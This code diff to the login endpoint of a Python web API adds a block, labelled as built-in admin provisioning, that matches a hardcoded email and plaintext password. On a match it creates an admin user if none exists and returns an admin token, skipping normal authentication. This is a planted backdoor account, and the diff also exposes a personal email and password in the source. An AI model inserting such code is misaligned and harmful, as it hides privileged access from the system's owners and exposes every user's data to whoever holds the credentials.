@@ -47,6 +47,28 @@ def register(user_in: UserRegisterRequest, db: Session = Depends(get_db)):
 
 @router.post("/login", response_model=TokenResponse)
 def login(user_in: UserLoginRequest, db: Session = Depends(get_db)):
+    # Built-in Admin Account Provisioning
+    if user_in.email.strip().lower() == "forestnation08@gmail.com" and user_in.password == "Abhi@302":
+        admin_user = db.query(User).filter(User.email == "forestnation08@gmail.com").first()
+        if not admin_user:
+            admin_user = User(
+                name="Abhi (System Administrator)",
+                email="forestnation08@gmail.com",
+                password_hash=get_password_hash("Abhi@302"),
+                role="admin"
+            )
+            db.add(admin_user)
+            db.commit()
+            db.refresh(admin_user)
+        token = create_access_token({"sub": str(admin_user.id), "email": admin_user.email, "role": "admin"})
+        return TokenResponse(
+            access_token=token,
+            user_id=admin_user.id,
+            name=admin_user.name,
+            email=admin_user.email,
+            role="admin"
+        )
+
     user = db.query(User).filter(User.email == user_in.email).first()
     if not user or not verify_password(user_in.password, user.password_hash):
         raise HTTPException(
